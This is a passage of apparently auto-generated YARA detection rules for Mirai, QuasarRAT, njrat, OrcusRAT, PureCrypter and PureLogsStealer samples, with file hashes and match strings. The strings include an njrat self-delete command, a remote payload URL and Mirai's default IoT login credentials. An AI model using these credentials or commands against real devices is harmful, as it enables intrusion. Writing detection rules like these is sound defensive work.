      hash1 = "e2bd07c2449ba0135da0e239310cb157d3fc2106610133eb365dc6602b96893b"
      hash2 = "e537e1d64cf006e0b1cd2fcf26f8ac277a1c7ed4c481df2428006d3ea2cd5b02"
      hash3 = "e5820391ace17fd7401509a07806c03cc40c3bdc05633bb5c671b6dc79738278"
      hash4 = "e64a7016accf95f6c7ca9f60183d9f34e1dc47bf66f27889964bfd185f3afa97"
      hash5 = "e6fc780670665fe812753a9cfc8813d1dca9f568b41c429623176f3b16dff4ac"
      hash6 = "e724c0315b16e070a8408bd63678b363419b127313335303bd660c6333b490b3"
      hash7 = "e98a982a8ca994a9fb3689b60c8a5bb5ae3908644bdf592deb4578ca46e06318"
      hash8 = "f21b61eda803995cf980b9a897e36d91aedb430f2b07258ee2efbb466105eb1f"
      hash9 = "f655d8f958ac76b94b196b1e4db839cf75599f7f71f31cd92d3d60609f330521"
      hash10 = "fcdd10162bcdf72f022da7e1883227f26eedead93d9f3e028d01cae38a00e2a3"
   strings:
      $s1 = "nprocessors_onln" fullword ascii /* score: '15.00'*/
      $s2 = "__GI_config_read" fullword ascii /* score: '10.00'*/
      $s3 = "__GI_getpagesize" fullword ascii /* score: '9.00'*/
      $s4 = "__GI_getrlimit" fullword ascii /* score: '9.00'*/
      $s5 = "getppid.c" fullword ascii /* score: '9.00'*/
      $s6 = "getpagesize.c" fullword ascii /* score: '9.00'*/
      $s7 = "__GI_getdtablesize" fullword ascii /* score: '9.00'*/
      $s8 = "fgetc.c" fullword ascii /* score: '9.00'*/
      $s9 = "getrlimit.c" fullword ascii /* score: '9.00'*/
      $s10 = "readdir64" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _PureCrypter_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__175bef16_PureCrypter_signature__f34d5f2d4577ed6d9ceec516c1_56 {
   meta:
      description = "_subset_batch - from files PureCrypter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_175bef16.exe, PureCrypter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_50f9b0aa.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "175bef16ead76c37e985239e103f32e0e2259c51a68c05d75392758c25fdebc7"
      hash2 = "50f9b0aa52b26d05fe991fd06d471fe3fae406d4660c0faf592e9f4aca1388b9"
   strings:
      $s1 = "2TimeZoneConverter.DataLoader+<GetEmbeddedData>d__1" fullword ascii /* score: '25.00'*/
      $s2 = "DataLoader" fullword ascii /* score: '13.00'*/
      $s3 = "<GetSystemTimeZones>b__32_0" fullword ascii /* score: '12.00'*/
      $s4 = "<GetSystemTimeZones>b__32_1" fullword ascii /* score: '12.00'*/
      $s5 = "get_KnownWindowsTimeZoneIds" fullword ascii /* score: '9.00'*/
      $s6 = "GetEmbeddedData" fullword ascii /* score: '9.00'*/
      $s7 = "TryGetTimeZoneInfo" fullword ascii /* score: '9.00'*/
      $s8 = "GetTimeZoneInfo" fullword ascii /* score: '9.00'*/
      $s9 = "get_KnownRailsTimeZoneNames" fullword ascii /* score: '9.00'*/
      $s10 = "get_KnownIanaTimeZoneNames" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _Mirai_signature__e5820391_Mirai_signature__f21b61ed_57 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e5820391.elf, Mirai(signature)_f21b61ed.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e5820391ace17fd7401509a07806c03cc40c3bdc05633bb5c671b6dc79738278"
      hash2 = "f21b61eda803995cf980b9a897e36d91aedb430f2b07258ee2efbb466105eb1f"
   strings:
      $s1 = "commands_process" fullword ascii /* score: '23.00'*/
      $s2 = "flood_udp_bypass" fullword ascii /* score: '20.00'*/
      $s3 = "fill_attack_target" fullword ascii /* score: '14.00'*/
      $s4 = "commands.c" fullword ascii /* score: '12.00'*/
      $s5 = "exploitscanner_setup_connection" fullword ascii /* score: '12.00'*/
      $s6 = "commands_parse" fullword ascii /* score: '12.00'*/
      $s7 = "exploitscanner_recv_strip_null" fullword ascii /* score: '9.00'*/
      $s8 = "fake_time" fullword ascii /* score: '9.00'*/
      $s9 = "exploitscanner_fake_time" fullword ascii /* score: '9.00'*/
      $s10 = "util_encryption" fullword ascii /* score: '9.00'*/
      $s11 = "exploitscanner_rsck" fullword ascii /* score: '9.00'*/
      $s12 = "exploitscanner_scanner_rawpkt" fullword ascii /* score: '9.00'*/
      $s13 = "exploit_init" fullword ascii /* score: '8.00'*/
      $s14 = "exploit_kill" fullword ascii /* score: '8.00'*/
      $s15 = "cncsocket" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _N_W_rm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash___58 {
   meta:
      description = "_subset_batch - from files N-W-rm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_074e6f0b.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0ae8c502.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_21ea4b39.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2f3c0ed2.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5b14108c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_601331cb.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_650ca510.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67504a7c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6b67447d.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_87688590.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_91638b5c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9aa99c6f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a6640f14.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b4cc1820.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d017447f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d42ac4e3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_db728098.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2b9797f8cc8259275cbb727b5ec10068ea868838cd803381b7089ba97c8b1b7b"
      hash2 = "074e6f0bbab42ec220ce7c74545986d8ba1a641eb1f8690ad0d90063b0529844"
      hash3 = "0ae8c5022567fc8588fdc2fbf27d1d245f7e9bb15a23cb8a01962be6b51cb73c"
      hash4 = "21ea4b39f79a9af056ffc368cc9e78abbddec1838885b00a4d7eaeeb306d8515"
      hash5 = "2f3c0ed245f51ba046dc425e32409890f029a235cf0cc4330c5088bc1465053d"
      hash6 = "5b14108c4f7e043dd7e9a0f9a3793608bf5690ae37b4e624a06d10bfbc6e61c1"
      hash7 = "601331cb72752cbcc12488cbd5a679325dd2d76696e87f7c3195cba348f3d215"
      hash8 = "650ca51048cf80b76d0450b73b41a1e12b81d8c0f3288fe67204a0be985e1693"
      hash9 = "67504a7c1e834ec7a871393547f566e8e0d40b5a1bf1d63b6676345266dea1e9"
      hash10 = "6b67447d97fcaca79ed98bcd6461b06445e978be3d45d4b0e2637057da97c4c2"
      hash11 = "8768859060387f56a2243b3d68d1b88fc12def261668c945d67ba7772f569b24"
      hash12 = "91638b5c9331d91c57a3b55363a7f5c76082d9261a8cfefc34fd3923dcf32dd5"
      hash13 = "9aa99c6f7cab60192507282874b120aa0401f64a2a56c23ef23aa781a90e7c5f"
      hash14 = "a6640f14b119df661bb6d99d1e16a07a5d0f609c5d4ea3375ef3fa74bcab8d14"
      hash15 = "b4cc18207df83ad7c5fee8b34d2f2e680ba7dc45e51002d62712034a4cef69c6"
      hash16 = "d017447f8ef2d707ce3a908e05bcac2206d8f5b8d63b72e494a81eb379b69853"
      hash17 = "d42ac4e3da7e1aa7ae41d0547c0cdcf1e30300fb2ea96cea42bb1d43a5000b27"
      hash18 = "db728098ee83742156ca473750c72cc14ea5d249cb61a1168009eacbd880c1b3"
   strings:
      $s1 = "GetPasswordsResponse" fullword ascii /* score: '17.00'*/
      $s2 = "DoProcessStart" fullword ascii /* score: '15.00'*/
      $s3 = "SetUserStatus" fullword ascii /* score: '12.00'*/
      $s4 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A" fullword wide /* score: '12.00'*/
      $s5 = "get_PathType" fullword ascii /* score: '9.00'*/
      $s6 = "GetMonitors" fullword ascii /* score: '9.00'*/
      $s7 = "GetStartupItemsResponse" fullword ascii /* score: '9.00'*/
      $s8 = "GetMonitorsResponse" fullword ascii /* score: '9.00'*/
      $s9 = "GetStartupItems" fullword ascii /* score: '9.00'*/
      $s10 = "GetDesktopResponse" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _N_W_rm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash___59 {
   meta:
      description = "_subset_batch - from files N-W-rm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2f3c0ed2.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5b14108c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d42ac4e3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2b9797f8cc8259275cbb727b5ec10068ea868838cd803381b7089ba97c8b1b7b"
      hash2 = "2f3c0ed245f51ba046dc425e32409890f029a235cf0cc4330c5088bc1465053d"
      hash3 = "5b14108c4f7e043dd7e9a0f9a3793608bf5690ae37b4e624a06d10bfbc6e61c1"
      hash4 = "d42ac4e3da7e1aa7ae41d0547c0cdcf1e30300fb2ea96cea42bb1d43a5000b27"
   strings:
      $s1 = "get_encryptedPassword" fullword ascii /* score: '22.00'*/
      $s2 = "get_encryptedUsername" fullword ascii /* score: '17.00'*/
      $s3 = "get_logins" fullword ascii /* score: '17.00'*/
      $s4 = "set_encryptedPassword" fullword ascii /* score: '17.00'*/
      $s5 = "get_timePasswordChanged" fullword ascii /* score: '17.00'*/
      $s6 = "get_passwordField" fullword ascii /* score: '17.00'*/
      $s7 = "_imageProcessLock" fullword ascii /* score: '15.00'*/
      $s8 = "get_disabledHosts" fullword ascii /* score: '14.00'*/
      $s9 = "set_encryptedUsername" fullword ascii /* score: '12.00'*/
      $s10 = "set_timePasswordChanged" fullword ascii /* score: '12.00'*/
      $s11 = "get_httpRealm" fullword ascii /* score: '12.00'*/
      $s12 = "get_usernameField" fullword ascii /* score: '12.00'*/
      $s13 = "set_logins" fullword ascii /* score: '12.00'*/
      $s14 = "set_passwordField" fullword ascii /* score: '12.00'*/
      $s15 = "_decodedBitmap" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _njrat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__njrat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9a36a_60 {
   meta:
      description = "_subset_batch - from files njrat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, njrat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9a36a357.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "36f6c3ba39bba88fbb949f9ac6956016bca8301fecc846ebe8f798639e1d8bf6"
      hash2 = "9a36a3573c402a9719c8b8b10a492bafddbb3badb9aaf37bf976e44ceb050892"
   strings:
      $x1 = "cmd.exe /k ping 0 & del \"" fullword wide /* score: '42.00'*/
      $s2 = "taskkill /F /IM PING.EXE" fullword wide /* score: '27.00'*/
      $s3 = "Exsample.exe" fullword wide /* score: '22.00'*/
      $s4 = "/pass.exe" fullword wide /* score: '22.00'*/
      $s5 = "https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe?dl=0" fullword wide /* score: '22.00'*/
      $s6 = "processviewer" fullword wide /* score: '19.00'*/
      $s7 = "/temp.txt" fullword wide /* score: '18.00'*/
      $s8 = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" fullword wide /* score: '16.00'*/
      $s9 = "End process" fullword wide /* score: '15.00'*/
      $s10 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore" fullword wide /* score: '14.00'*/
      $s11 = "shellexecute=" fullword wide /* score: '14.00'*/
      $s12 = "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System" fullword wide /* score: '13.00'*/
      $s13 = "lpCommandString" fullword ascii /* score: '12.00'*/
      $s14 = "shutdown -l -t 00" fullword wide /* score: '12.00'*/
      $s15 = "taskkill /F /IM " fullword wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _OrcusRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__OrcusRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__61 {
   meta:
      description = "_subset_batch - from files OrcusRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, OrcusRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_eb8df076.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_074e6f0b.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0ae8c502.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_21ea4b39.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5b14108c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_601331cb.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_650ca510.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67504a7c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_91638b5c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a6640f14.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_db728098.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a2c9a9ebdf13c0c7994382cb7e01fe0374bf43253dd58f908f60be03177753a1"
      hash2 = "eb8df076a9c27ca87f349a751a3f74d8f121ec0e96da996942d02099510085ea"
      hash3 = "074e6f0bbab42ec220ce7c74545986d8ba1a641eb1f8690ad0d90063b0529844"
      hash4 = "0ae8c5022567fc8588fdc2fbf27d1d245f7e9bb15a23cb8a01962be6b51cb73c"
      hash5 = "21ea4b39f79a9af056ffc368cc9e78abbddec1838885b00a4d7eaeeb306d8515"
      hash6 = "5b14108c4f7e043dd7e9a0f9a3793608bf5690ae37b4e624a06d10bfbc6e61c1"
      hash7 = "601331cb72752cbcc12488cbd5a679325dd2d76696e87f7c3195cba348f3d215"
      hash8 = "650ca51048cf80b76d0450b73b41a1e12b81d8c0f3288fe67204a0be985e1693"
      hash9 = "67504a7c1e834ec7a871393547f566e8e0d40b5a1bf1d63b6676345266dea1e9"
      hash10 = "91638b5c9331d91c57a3b55363a7f5c76082d9261a8cfefc34fd3923dcf32dd5"
      hash11 = "a6640f14b119df661bb6d99d1e16a07a5d0f609c5d4ea3375ef3fa74bcab8d14"
      hash12 = "db728098ee83742156ca473750c72cc14ea5d249cb61a1168009eacbd880c1b3"
   strings:
      $s1 = "IESecretInfoHeader" fullword ascii /* score: '12.00'*/
      $s2 = "IEAutoComplteSecretHeader" fullword ascii /* score: '12.00'*/
      $s3 = "IESecretHeader" fullword ascii /* score: '12.00'*/
      $s4 = "dwIdHeader" fullword ascii /* score: '9.00'*/
      $s5 = "SecretId1" fullword ascii /* score: '8.00'*/
      $s6 = "SecretId7" fullword ascii /* score: '8.00'*/
      $s7 = "SecretId5" fullword ascii /* score: '8.00'*/
      $s8 = "SecretId4" fullword ascii /* score: '8.00'*/
      $s9 = "SecretId6" fullword ascii /* score: '8.00'*/
      $s10 = "SecretId2" fullword ascii /* score: '8.00'*/
      $s11 = "SecretId3" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _N_W_rm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash___62 {
   meta:
      description = "_subset_batch - from files N-W-rm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_074e6f0b.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0ae8c502.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_12bc2271.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_21ea4b39.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2f3c0ed2.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5b14108c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_601331cb.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_650ca510.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67504a7c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6b67447d.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_87688590.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_91638b5c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9aa99c6f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a6640f14.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b4cc1820.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d017447f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d42ac4e3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_db728098.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dd24e53f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2b9797f8cc8259275cbb727b5ec10068ea868838cd803381b7089ba97c8b1b7b"
      hash2 = "074e6f0bbab42ec220ce7c74545986d8ba1a641eb1f8690ad0d90063b0529844"
      hash3 = "0ae8c5022567fc8588fdc2fbf27d1d245f7e9bb15a23cb8a01962be6b51cb73c"
      hash4 = "12bc2271f1028192e643c23aea3eb3d802dd24d03ece51f62db4dd0c81e7aff2"
      hash5 = "21ea4b39f79a9af056ffc368cc9e78abbddec1838885b00a4d7eaeeb306d8515"
      hash6 = "2f3c0ed245f51ba046dc425e32409890f029a235cf0cc4330c5088bc1465053d"
      hash7 = "5b14108c4f7e043dd7e9a0f9a3793608bf5690ae37b4e624a06d10bfbc6e61c1"
      hash8 = "601331cb72752cbcc12488cbd5a679325dd2d76696e87f7c3195cba348f3d215"
      hash9 = "650ca51048cf80b76d0450b73b41a1e12b81d8c0f3288fe67204a0be985e1693"
      hash10 = "67504a7c1e834ec7a871393547f566e8e0d40b5a1bf1d63b6676345266dea1e9"
      hash11 = "6b67447d97fcaca79ed98bcd6461b06445e978be3d45d4b0e2637057da97c4c2"
      hash12 = "8768859060387f56a2243b3d68d1b88fc12def261668c945d67ba7772f569b24"
      hash13 = "91638b5c9331d91c57a3b55363a7f5c76082d9261a8cfefc34fd3923dcf32dd5"
      hash14 = "9aa99c6f7cab60192507282874b120aa0401f64a2a56c23ef23aa781a90e7c5f"
      hash15 = "a6640f14b119df661bb6d99d1e16a07a5d0f609c5d4ea3375ef3fa74bcab8d14"
      hash16 = "b4cc18207df83ad7c5fee8b34d2f2e680ba7dc45e51002d62712034a4cef69c6"
      hash17 = "d017447f8ef2d707ce3a908e05bcac2206d8f5b8d63b72e494a81eb379b69853"
      hash18 = "d42ac4e3da7e1aa7ae41d0547c0cdcf1e30300fb2ea96cea42bb1d43a5000b27"
      hash19 = "db728098ee83742156ca473750c72cc14ea5d249cb61a1168009eacbd880c1b3"
      hash20 = "dd24e53f878c083f08795e1482ee67c971b80b27264ea6d30adafeaaa9ae27df"
   strings:
      $s1 = "GetProcessesResponse" fullword ascii /* score: '20.00'*/
      $s2 = "DoShellExecuteResponse" fullword ascii /* score: '18.00'*/
      $s3 = "DoShellExecute" fullword ascii /* score: '18.00'*/
      $s4 = "SELECT * FROM Win32_OperatingSystem WHERE Primary='true'" fullword wide /* score: '16.00'*/
      $s5 = "Select * From Win32_ComputerSystem" fullword wide /* score: '14.00'*/
      $s6 = "get_RemotePath" fullword ascii /* score: '12.00'*/
      $s7 = "GetSystemInfoResponse" fullword ascii /* score: '12.00'*/
      $s8 = "Getting uptime failed" fullword wide /* score: '12.00'*/
      $s9 = "GetDirectoryResponse" fullword ascii /* score: '9.00'*/
      $s10 = "GetDrivesResponse" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0902ce08_PureLogsStealer_signature__f34d5f2d4577ed6d9c_63 {
   meta:
      description = "_subset_batch - from files PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0902ce08.exe, PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a2baa23b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0902ce086eea466e676170f68d4f7f64e7df49aaf43ea6f33f4d5e3cda3f9958"
      hash2 = "a2baa23bbe548f06cf0ae0f0487cf55bbec120d7d36d7d4eeaafe3ba3397faee"
   strings:
      $s1 = "ExecuteFullPipeline" fullword ascii /* score: '24.00'*/
      $s2 = "get_ExecutionTime" fullword ascii /* score: '21.00'*/
      $s3 = "<ExecutionTime>k__BackingField" fullword ascii /* score: '16.00'*/
      $s4 = "set_ExecutionTime" fullword ascii /* score: '16.00'*/
      $s5 = "get_EncryptionIV" fullword ascii /* score: '14.00'*/
      $s6 = "AssemblyPipelineProcessor" fullword ascii /* score: '14.00'*/
      $s7 = "PipelineConfiguration" fullword ascii /* score: '10.00'*/
      $s8 = "PipelineResult" fullword ascii /* score: '10.00'*/
      $s9 = "<EncryptionIV>k__BackingField" fullword ascii /* score: '9.00'*/
      $s10 = "set_EncryptionIV" fullword ascii /* score: '9.00'*/
      $s11 = "get_TimeoutMs" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 60KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__e1934cc8_Mirai_signature__ec32c78d_Mirai_signature__f528fd54_Mirai_signature__ffbe0169_64 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e1934cc8.elf, Mirai(signature)_ec32c78d.elf, Mirai(signature)_f528fd54.elf, Mirai(signature)_ffbe0169.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e1934cc82ef7064790319280be9acf4ceaa40c7dff223b940aa6198b8684b955"
      hash2 = "ec32c78d650d3122de4603ef5a4798a2cb115d4fd13c0d37b258b68caed04c7d"
      hash3 = "f528fd546298da5fbe9d5fbcb79ca1ce0fab6ee938e7b965dfb57e5c6e92c590"
      hash4 = "ffbe0169bc4929b9956110b0749641a03e22c8c8895a9a126358b717ed11f6c6"
   strings:
      $s1 = "tluafed" fullword ascii /* reversed goodware string 'default' */ /* score: '18.00'*/
      $s2 = "xirtam" fullword ascii /* reversed goodware string 'matrix' */ /* score: '15.00'*/
      $s3 = "admintelecom" fullword ascii /* score: '11.00'*/
      $s4 = "solokey" fullword ascii /* score: '11.00'*/
      $s5 = "supportadmin" fullword ascii /* score: '11.00'*/
      $s6 = "telecomadmin" fullword ascii /* score: '11.00'*/
      $s7 = "zhongxing" fullword ascii /* score: '8.00'*/
      $s8 = "grouter" fullword ascii /* score: '8.00'*/
      $s9 = "root123" fullword ascii /* score: '8.00'*/
      $s10 = "tsgoingon" fullword ascii /* score: '8.00'*/
      $s11 = "root621" fullword ascii /* score: '8.00'*/
      $s12 = "telnetadmin" fullword ascii /* score: '8.00'*/
      $s13 = "wabjtam" fullword ascii /* score: '8.00'*/
      $s14 = "hikvision" fullword ascii /* score: '8.00'*/
      $s15 = "firetide" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _N_W_rm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash___65 {
   meta:
      description = "_subset_batch - from files N-W-rm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_074e6f0b.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0ae8c502.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_21ea4b39.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2f3c0ed2.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_601331cb.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_650ca510.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67504a7c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6b67447d.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_87688590.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_91638b5c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9aa99c6f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a6640f14.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b4cc1820.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d017447f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d42ac4e3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_db728098.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2b9797f8cc8259275cbb727b5ec10068ea868838cd803381b7089ba97c8b1b7b"
      hash2 = "074e6f0bbab42ec220ce7c74545986d8ba1a641eb1f8690ad0d90063b0529844"
      hash3 = "0ae8c5022567fc8588fdc2fbf27d1d245f7e9bb15a23cb8a01962be6b51cb73c"
      hash4 = "21ea4b39f79a9af056ffc368cc9e78abbddec1838885b00a4d7eaeeb306d8515"
      hash5 = "2f3c0ed245f51ba046dc425e32409890f029a235cf0cc4330c5088bc1465053d"
      hash6 = "601331cb72752cbcc12488cbd5a679325dd2d76696e87f7c3195cba348f3d215"
      hash7 = "650ca51048cf80b76d0450b73b41a1e12b81d8c0f3288fe67204a0be985e1693"
      hash8 = "67504a7c1e834ec7a871393547f566e8e0d40b5a1bf1d63b6676345266dea1e9"
      hash9 = "6b67447d97fcaca79ed98bcd6461b06445e978be3d45d4b0e2637057da97c4c2"
      hash10 = "8768859060387f56a2243b3d68d1b88fc12def261668c945d67ba7772f569b24"
